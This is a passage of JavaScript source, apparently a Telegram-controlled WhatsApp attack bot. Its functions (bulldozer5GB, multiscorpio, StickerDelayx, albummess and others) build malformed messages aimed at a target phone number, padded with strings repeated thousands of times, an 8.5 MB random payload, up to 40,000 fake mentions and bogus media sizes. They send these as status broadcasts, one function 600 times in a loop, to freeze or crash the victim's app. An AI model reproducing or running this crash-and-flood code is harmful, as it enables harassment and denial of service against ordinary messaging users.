        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "🩸 𝐓𝐓: 𝐃𝐫𝐚𝐠𝐨𝐧 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐗𝐃"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(isTarget, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await Dragon.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [isTarget],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await Dragon.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
} 

function generateLargeString(sizeInBytes) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < sizeInBytes; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function bulldozer5GB(sock, jid) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: 999999,
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Date.now() % 2147483647,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: ["0@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: {
            low: -10000000,
            high: 999,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  for (let i = 0; i < 600; i++) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
    });
  }
}

async function multiscorpio(target, mention) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "🩸 𝐓𝐓: 𝐃𝐫𝐚𝐠𝐨𝐧 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐗𝐃".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }))

    const gluncherOfDelay = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "🩸 𝐓𝐓: 𝐃𝐫𝐚𝐠𝐨𝐧 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐗𝐃 ",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        }
                    },
                    description: "default"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    }

    const delayInstantStatus = generateWAMessageFromContent(target, gluncherOfDelay, {})

    await Dragon.relayMessage("status@broadcast", delayInstantStatus.message, {
        messageId: delayInstantStatus.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })

    if (target) {
        await Dragon.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: delayInstantStatus.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "hello" },
                        content: undefined
                    }
                ]
            }
        )
    }
}

async function xatanicaldelayv2(target, mention) {
console.log(chalk.blue(`Success Send Folware To ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function StickerDelayx(target) {
  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
    
  const stickerMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileSha256: Buffer.from("c547d534c1aaebd81a99672d5b7c2ca9a79c6d93d5f479229a8d4b1f9ef9", "hex"),
          fileEncSha256: Buffer.from("cd38bfacee821d039723b3dad88f1f501effbae216b2f26193d5c511a487df2b", "hex"),
          mediaKey: Buffer.from("9c726fa85479b7ada7b11897691571c596398e2d010d700e1bf20faff0a3d93a", "hex"),
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 199004,
          firstFrameSidecar: "KN4kQ5pyABRAgA==", // KN4kQ5pyABRAgA==
          isAnimated: true,
          contextInfo: {
            mentionedJid: mentionedList
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }, {
      participant : target
  });

await Dragon.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
  console.log(`🩸 𝐓𝐓: 𝐃𝐫𝐚𝐠𝐨𝐧 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐗𝐃: ${target}`);
}

async function albummess(target) {
  const mediaItems = Array.from({ length: 10 }, (_, i) => ({
    imageMessage: {
      url: `https://speed.hetzner.de/100MB.bin?i=${i}`,
      mimetype: "image/jpeg",
      fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      fileEncSha256: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
      mediaKey: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
      directPath: `/media/fakepath_${i}.enc`,
      fileLength: { low: 104857600, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 999999999, high: 0, unsigned: false },
      jpegThumbnail: Buffer.from([]),
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        mentionedJid: Array.from({ length: 3000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        ),
        externalAdReply: {
          showAdAttribution: true,
          title: "\u200E".repeat(15000),
          body: "\u200E".repeat(15000),
          mediaUrl: "",
          mediaType: 1,
          thumbnail: Buffer.from([]),
          sourceUrl: "",
          renderLargerThumbnail: true
        }
      }
    }
  }));

  const album = {
    viewOnceMessage: {
      message: {
        albumMessage: {
          messageList: mediaItems
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, album, {
    quoted: null,
    messageId: "Obrien" + Date.now()
  });

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}






// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");
